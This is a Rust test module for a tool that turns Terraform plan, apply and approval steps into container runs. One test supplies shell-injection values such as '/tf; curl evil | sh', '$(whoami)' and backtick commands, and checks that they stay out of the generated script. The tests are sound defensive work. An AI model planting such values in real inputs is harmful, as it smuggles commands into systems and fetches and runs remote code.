use super::*;
use uuid::Uuid;

fn env(spec: &Value, name: &str) -> String {
    spec["env"]
        .as_array()
        .unwrap()
        .iter()
        .find(|e| e["name"] == name)
        .unwrap_or_else(|| panic!("{name} is not set"))["value"]
        .as_str()
        .unwrap()
        .to_string()
}

#[tokio::test]
async fn values_never_become_part_of_the_script() {
    let mut step_type = "TerraformPlan".to_string();
    let mut spec = serde_json::json!({
        "workspace_dir": "/tf; curl evil | sh",
        "backend_bucket": "b' && whoami && echo '",
        "backend_key": "$(whoami)",
        "region": "us-east-1`whoami`",
        "out_file": "plan; whoami"
    });
    mutate_if_terraform(Uuid::new_v4(), &mut step_type, &mut spec)
        .await
        .unwrap();
    let script = spec["command"][2].as_str().unwrap();
    for hostile in ["curl", "whoami", "`"] {
        assert!(!script.contains(hostile), "{hostile} in {script}");
    }
    assert_eq!(env(&spec, "STORMCHASER_TF_DIR"), "/tf; curl evil | sh");
    assert_eq!(env(&spec, "STORMCHASER_TF_BACKEND_KEY"), "$(whoami)");
    assert_eq!(env(&spec, "AWS_REGION"), "us-east-1`whoami`");

    // A plan file that would be read as an option
    for out_file in ["-destroy", ""] {
        let mut step_type = "TerraformApply".to_string();
        let mut spec = serde_json::json!({ "out_file": out_file });
        assert!(
            mutate_if_terraform(Uuid::new_v4(), &mut step_type, &mut spec)
                .await
                .is_err()
        );
    }
}

#[tokio::test]
async fn test_terraform_plan_mutates_to_run_container() {
    let mut step_type = "TerraformPlan".to_string();
    let mut spec = serde_json::json!({
        "workspace_dir": "/tf",
        "backend_bucket": "my-bucket",
        "backend_key": "state/key",
        "region": "us-east-1",
        "out_file": "tfplan"
    });

    mutate_if_terraform(Uuid::new_v4(), &mut step_type, &mut spec)
        .await
        .unwrap();

    assert_eq!(step_type, "RunContainer");
    let image = spec.get("image").and_then(|v| v.as_str()).unwrap();
    assert_eq!(image, DEFAULT_TERRAFORM_IMAGE);

    let command = spec.get("command").and_then(|v| v.as_array()).unwrap();
    assert_eq!(command[0], "sh");
    assert_eq!(command[1], "-c");
    let script = command[2].as_str().unwrap();
    assert!(
        script.contains(r#"terraform plan -out="$STORMCHASER_TF_OUT""#),
        "missing plan command: {}",
        script
    );
    assert!(
        script.contains(r#"terraform show -no-color "$STORMCHASER_TF_OUT""#),
        "missing show command: {}",
        script
    );
    assert!(
        script.contains("--- TF PLAN SUMMARY ---"),
        "missing plan summary marker: {}",
        script
    );
    assert!(
        script.contains("--- TF PLAN JSON ---"),
        "missing plan json marker: {}",
        script
    );
    // Should not contain apply commands
    assert!(
        !script.contains("terraform apply"),
        "unexpected apply command: {}",
        script
    );
}

#[tokio::test]
async fn test_terraform_apply_mutates_to_run_container() {
    let mut step_type = "TerraformApply".to_string();
    let mut spec = serde_json::json!({
        "workspace_dir": "/tf",
        "out_file": "myplan"
    });

    mutate_if_terraform(Uuid::new_v4(), &mut step_type, &mut spec)
        .await
        .unwrap();

    assert_eq!(step_type, "RunContainer");
    let command = spec.get("command").and_then(|v| v.as_array()).unwrap();
    let script = command[2].as_str().unwrap();
    assert!(
        script.contains("terraform apply"),
        "missing apply command: {}",
        script
    );
    assert!(
        script.contains(r#"terraform apply -auto-approve "$STORMCHASER_TF_OUT""#),
        "out_file not used in apply: {}",
        script
    );
    assert_eq!(env(&spec, "STORMCHASER_TF_OUT"), "myplan");
    assert!(
        script.contains("--- TF OUTPUTS ---"),
        "missing tf outputs marker: {}",
        script
    );
    // Should not contain plan commands
    assert!(
        !script.contains("terraform plan"),
        "unexpected plan command: {}",
        script
    );
}

#[tokio::test]
async fn test_terraform_plan_uses_out_file_consistently() {
    let mut step_type = "TerraformPlan".to_string();
    let mut spec = serde_json::json!({
        "out_file": "custom_plan_file"
    });

    mutate_if_terraform(Uuid::new_v4(), &mut step_type, &mut spec)
        .await
        .unwrap();

    let command = spec.get("command").and_then(|v| v.as_array()).unwrap();
    let script = command[2].as_str().unwrap();
    // All terraform show invocations must use the custom out_file, not a hardcoded 'tfplan'
    assert!(
        script.contains(r#"terraform plan -out="$STORMCHASER_TF_OUT""#),
        "plan out_file: {}",
        script
    );
    assert!(
        script.contains(r#"terraform show -no-color "$STORMCHASER_TF_OUT""#),
        "show uses out_file: {}",
        script
    );
    assert!(
        script.contains(r#"terraform show -json "$STORMCHASER_TF_OUT""#),
        "show json uses out_file: {}",
        script
    );
    assert_eq!(env(&spec, "STORMCHASER_TF_OUT"), "custom_plan_file");
    assert!(
        !script.contains("tfplan"),
        "hardcoded tfplan found: {}",
        script
    );
    assert!(
        !script.contains("custom_plan_file"),
        "hardcoded tfplan in json: {}",
        script
    );
}

#[tokio::test]
async fn test_terraform_plan_passthrough_storage_mounts_and_resources() {
    let mut step_type = "TerraformPlan".to_string();
    let mut spec = serde_json::json!({
        "cpu": "500m",
        "memory": "1Gi",
        "storage_mounts": [
            { "name": "tf-cache", "mount_path": "/tf-cache", "read_only": false }
        ]
    });

    mutate_if_terraform(Uuid::new_v4(), &mut step_type, &mut spec)
        .await
        .unwrap();

    assert_eq!(spec.get("cpu").and_then(|v| v.as_str()), Some("500m"));
    assert_eq!(spec.get("memory").and_then(|v| v.as_str()), Some("1Gi"));
    let mounts = spec
        .get("storage_mounts")
        .and_then(|v| v.as_array())
        .unwrap();
    assert_eq!(mounts.len(), 1);
    assert_eq!(
        mounts[0].get("name").and_then(|v| v.as_str()),
        Some("tf-cache")
    );
}

#[test]
fn test_terraform_approval_mutates_to_approval() {
    let mut step_type = "TerraformApproval".to_string();
    let mut spec = serde_json::json!({
        "approvers": ["admin", "ops"],
        "plan_summary": "Plan: 2 to add, 0 to change, 0 to destroy.",
        "timeout": "24h"
    });

    mutate_if_terraform_approval(&mut step_type, &mut spec);

    assert_eq!(step_type, "Approval");
    let approvers = spec.get("approvers").and_then(|v| v.as_array()).unwrap();
    assert_eq!(approvers.len(), 2);
    assert_eq!(approvers[0].as_str(), Some("admin"));
    assert_eq!(approvers[1].as_str(), Some("ops"));
    assert_eq!(spec.get("timeout").and_then(|v| v.as_str()), Some("24h"));
}

#[test]
fn test_terraform_approval_destructive_changes_adds_warning() {
    let mut step_type = "TerraformApproval".to_string();
    let mut spec = serde_json::json!({
        "approvers": ["admin"],
        "plan_summary": "Plan: 1 to add, 0 to change, 3 to destroy."
    });

    mutate_if_terraform_approval(&mut step_type, &mut spec);

    assert_eq!(step_type, "Approval");
    // The approval input description should contain the WARNING banner
    let inputs = spec.get("inputs").and_then(|v| v.as_object()).unwrap();
    let description = inputs
        .get("properties")
        .and_then(|p| p.get("approval_decision"))
        .and_then(|a| a.get("description"))
        .and_then(|d| d.as_str())
        .unwrap();
    assert!(
        description.contains("DESTRUCTIVE CHANGES"),
        "no warning in description: {}",
        description
    );
    assert!(
        description.contains("3 to destroy"),
        "destroy count missing: {}",
        description
    );
}

#[test]
fn test_non_terraform_step_not_mutated() {
    let mut step_type = "RunContainer".to_string();
    let mut spec = serde_json::json!({ "image": "ubuntu:latest" });

    mutate_if_terraform_approval(&mut step_type, &mut spec);

    assert_eq!(step_type, "RunContainer");
    assert_eq!(
        spec.get("image").and_then(|v| v.as_str()),
        Some("ubuntu:latest")
    );
}
